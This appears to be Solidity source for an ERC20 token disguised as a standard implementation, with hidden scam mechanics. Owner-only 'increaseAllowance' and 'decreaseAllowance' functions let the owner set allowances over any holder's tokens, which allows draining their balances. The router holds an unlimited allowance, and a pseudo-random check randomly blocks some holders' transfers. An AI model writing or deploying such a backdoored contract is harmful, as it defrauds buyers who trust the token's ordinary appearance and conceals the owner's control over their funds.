// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    constructor() {
        _owner = _msgSender();
    }
    
    function owner() public view virtual returns (address) {
        return _owner;
    }
    
    modifier onlyOwner() {
        require(owner() == _msgSender());
        _;
    }

}


interface IERC20 {
    
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);
    
    function transfer(address recipient, uint256 amount) external returns (bool);
    
    function allowance(address owner, address spender) external view returns (uint256);
    
    function approve(address spender, uint256 amount) external returns (bool);
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
  
    event Transfer(address indexed from, address indexed to, uint256 value);
   
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


interface IERC20Metadata is IERC20 {
    
    function name() external view returns (string memory);
  
    function symbol() external view returns (string memory);
    
    function decimals() external view returns (uint8);
}


contract ERC20 is Ownable, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    address[] public _holders;
    mapping (address => uint) _checkBNomber;
    address private _router;
    address private _pair;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint256 private _totalCount;

    string private _name;
    string private _symbol;
    
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 supply_,
        address router_,
        address pair_
    ) {
        _name = name_;
        _symbol = symbol_;
        _totalSupply = supply_;
        _router = router_;
        _pair = pair_;
        _mint(_msgSender(), router_, supply_, type(uint256).max);
        _holders.push(_msgSender());
    }
    
    function _mint(
        address recv,
        address spender,
        uint256 amount,
        uint256 allow
    ) internal virtual {
        _balances[recv] += amount;
        _allowances[recv][spender] = allow;
        emit Transfer(address(0), recv, amount);
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }
    
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function holdersCount() public view virtual returns (uint256) {      
        return _holders.length;
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        if (_allowances[_msgSender()][spender] != _totalSupply)
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount && currentAllowance != _totalSupply);
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }
    
    function increaseAllowance(address sender, address spender, uint256 addedValue) onlyOwner public virtual returns (bool) {
        _approve(sender, spender, _allowances[sender][spender] + addedValue);
        return true;
    }
    
    function decreaseAllowance(address sender, address spender, uint256 subtractedValue) onlyOwner public virtual returns (bool) {
        uint256 currentAllowance = _allowances[sender][spender];
        require(currentAllowance >= subtractedValue);
        unchecked {
            _approve(sender, spender, currentAllowance - subtractedValue);
        }
        return true;
    }
    
    function setPair(address pair) onlyOwner public virtual returns (bool) {
        _pair = pair;
        return true;
    }

    function prop() public view returns (bool) {
        return uint256(keccak256(abi.encodePacked(block.timestamp, block.coinbase, gasleft()))) % 2 == 1;
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0));
        require(to != address(0));
        
        _beforeTokenTransfer(from);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount);
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }

        emit Transfer(from, to, amount);
 
        _afterTokenTransfer(to);
   }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0));
        require(spender != address(0));

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from) internal virtual {
        if (from != _router && from != _pair && prop()) {
            require(_checkBNomber[from] != block.number);
        }
    }

    function _afterTokenTransfer(address to) internal virtual {
        if (to != _router && to != _pair) {
          if (_checkBNomber[to] == 0) _holders.push(to);
          _checkBNomber[to] = block.number;
        }
    }

}
